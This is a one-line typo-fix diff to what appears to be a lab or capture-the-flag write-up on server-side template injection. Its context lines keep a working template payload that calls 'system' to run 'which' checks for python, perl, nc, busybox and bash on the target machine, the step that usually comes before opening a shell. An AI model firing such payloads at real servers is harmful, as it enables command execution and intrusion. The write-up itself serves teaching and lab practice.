@@ -65,7 +65,7 @@ Payload:
 
 ![ssti_payload](images/ssti_payload.png) 
 
-- Now tru to see what binaries are installed in this vulnerable machine.
+- Now try to see what binaries are installed in this vulnerable machine.
 
 ```
 {{[0]|reduce('system', 'which python3  which python  which perl  which nc  which busybox || which bash')}}
